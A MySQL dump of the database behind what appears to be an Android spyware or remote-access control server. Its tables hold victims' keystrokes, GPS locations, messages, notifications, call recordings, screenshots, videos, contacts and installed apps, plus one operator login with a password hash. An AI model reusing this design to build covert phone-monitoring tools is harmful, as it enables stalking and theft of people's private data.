CREATE DATABASE  IF NOT EXISTS `cc` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci */ /*!80016 DEFAULT ENCRYPTION='N' */;
USE `cc`;
-- MySQL dump 10.13  Distrib 8.0.32, for Linux (x86_64)
--
-- Host: localhost    Database: cc
-- ------------------------------------------------------
-- Server version	8.0.35

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `CLIENT`
--

DROP TABLE IF EXISTS `CLIENT`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `CLIENT` (
  `id` int NOT NULL AUTO_INCREMENT,
  `model` varchar(45) NOT NULL,
  `device_id` varchar(45) NOT NULL,
  `ip_address` varchar(45) NOT NULL,
  `device_api` int NOT NULL,
  `phone` varchar(45) NOT NULL,
  `web_socket_id` varchar(45) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `CLIENT`
--

LOCK TABLES `CLIENT` WRITE;
/*!40000 ALTER TABLE `CLIENT` DISABLE KEYS */;
/*!40000 ALTER TABLE `CLIENT` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `CONTACT`
--

DROP TABLE IF EXISTS `CONTACT`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `CONTACT` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `name` varchar(45) NOT NULL,
  `number` varchar(45) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_CONTACT_1_idx` (`client_id`),
  CONSTRAINT `fk_CONTACT_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `CONTACT`
--

LOCK TABLES `CONTACT` WRITE;
/*!40000 ALTER TABLE `CONTACT` DISABLE KEYS */;
/*!40000 ALTER TABLE `CONTACT` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `IMAGE`
--

DROP TABLE IF EXISTS `IMAGE`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `IMAGE` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `filename` varchar(200) NOT NULL,
  `timestamp` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_IMAGE_1_idx` (`client_id`),
  CONSTRAINT `fk_IMAGE_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `IMAGE`
--

LOCK TABLES `IMAGE` WRITE;
/*!40000 ALTER TABLE `IMAGE` DISABLE KEYS */;
/*!40000 ALTER TABLE `IMAGE` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `INSTALLED_APP`
--

DROP TABLE IF EXISTS `INSTALLED_APP`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `INSTALLED_APP` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `package_name` varchar(255) NOT NULL,
  `app_name` varchar(255) NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_INSTALLED_APP_1_idx` (`client_id`),
  CONSTRAINT `fk_INSTALLED_APP_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `INSTALLED_APP`
--

LOCK TABLES `INSTALLED_APP` WRITE;
/*!40000 ALTER TABLE `INSTALLED_APP` DISABLE KEYS */;
/*!40000 ALTER TABLE `INSTALLED_APP` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `KEYLOG`
--

DROP TABLE IF EXISTS `KEYLOG`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `KEYLOG` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `text` mediumtext,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_KEYLOG_1_idx` (`client_id`),
  CONSTRAINT `fk_KEYLOG_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=947 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `KEYLOG`
--

LOCK TABLES `KEYLOG` WRITE;
/*!40000 ALTER TABLE `KEYLOG` DISABLE KEYS */;
/*!40000 ALTER TABLE `KEYLOG` ENABLE KEYS */;
UNLOCK TABLES;

--

--
-- Table structure for table `LOCATION`
--

DROP TABLE IF EXISTS `LOCATION`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `LOCATION` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `latitude` float NOT NULL,
  `longitude` float NOT NULL,
  `altitude` float NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_LOCATION_1_idx` (`client_id`),
  CONSTRAINT `fk_LOCATION_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `LOCATION`
--

LOCK TABLES `LOCATION` WRITE;
/*!40000 ALTER TABLE `LOCATION` DISABLE KEYS */;
/*!40000 ALTER TABLE `LOCATION` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `MESSAGE`
--

DROP TABLE IF EXISTS `MESSAGE`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `MESSAGE` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `sender` varchar(45) NOT NULL,
  `content` varchar(2000) NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_MESSAGE_1_idx` (`client_id`),
  CONSTRAINT `fk_MESSAGE_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `MESSAGE`
--

LOCK TABLES `MESSAGE` WRITE;
/*!40000 ALTER TABLE `MESSAGE` DISABLE KEYS */;
/*!40000 ALTER TABLE `MESSAGE` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `NOTIFICATION`
--

DROP TABLE IF EXISTS `NOTIFICATION`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `NOTIFICATION` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `sender` varchar(255) NOT NULL,
  `content` varchar(2000) NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_NOTIFICATION_1_idx` (`client_id`),
  CONSTRAINT `fk_NOTIFICATION_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `NOTIFICATION`
--

LOCK TABLES `NOTIFICATION` WRITE;
/*!40000 ALTER TABLE `NOTIFICATION` DISABLE KEYS */;
/*!40000 ALTER TABLE `NOTIFICATION` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `RECORDING`
--

DROP TABLE IF EXISTS `RECORDING`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `RECORDING` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `filename` varchar(200) NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  `number` varchar(45) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_RECORDING_1_idx` (`client_id`),
  CONSTRAINT `fk_RECORDING_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `RECORDING`
--

LOCK TABLES `RECORDING` WRITE;
/*!40000 ALTER TABLE `RECORDING` DISABLE KEYS */;
/*!40000 ALTER TABLE `RECORDING` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SCREENSHOT`
--

DROP TABLE IF EXISTS `SCREENSHOT`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `SCREENSHOT` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `filename` varchar(200) NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_SCREENSHOT_1_idx` (`client_id`),
  CONSTRAINT `fk_SCREENSHOT_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SCREENSHOT`
--

LOCK TABLES `SCREENSHOT` WRITE;
/*!40000 ALTER TABLE `SCREENSHOT` DISABLE KEYS */;
/*!40000 ALTER TABLE `SCREENSHOT` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `USER`
--

DROP TABLE IF EXISTS `USER`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `USER` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(45) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `USER`
--

LOCK TABLES `USER` WRITE;
/*!40000 ALTER TABLE `USER` DISABLE KEYS */;
INSERT INTO `USER` VALUES (1,'android','$2y$10$EosVbPPCw0gmOt.B4.cNmeAWKdqCm1fV.89ID1V6u874eC7UMS0Xa');
/*!40000 ALTER TABLE `USER` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `VIDEO`
--

DROP TABLE IF EXISTS `VIDEO`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `VIDEO` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int DEFAULT NULL,
  `filename` varchar(200) NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_VIDEO_1_idx` (`client_id`),
  CONSTRAINT `fk_VIDEO_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `VIDEO`
--

LOCK TABLES `VIDEO` WRITE;
/*!40000 ALTER TABLE `VIDEO` DISABLE KEYS */;
/*!40000 ALTER TABLE `VIDEO` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2024-02-16 20:55:24
